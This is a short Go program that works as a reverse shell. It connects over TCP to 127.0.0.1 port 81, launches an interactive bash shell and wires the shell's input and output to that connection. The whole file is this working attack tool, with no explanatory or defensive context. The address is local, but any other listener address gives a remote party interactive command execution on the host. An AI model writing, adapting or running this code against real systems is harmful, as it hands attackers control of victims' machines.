package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {
	cmd := exec.Command("/bin/bash", "-i")
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	conn, err := net.Dial("tcp", "127.0.0.1:81")
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Println("Connected!")
	handle(conn)
}
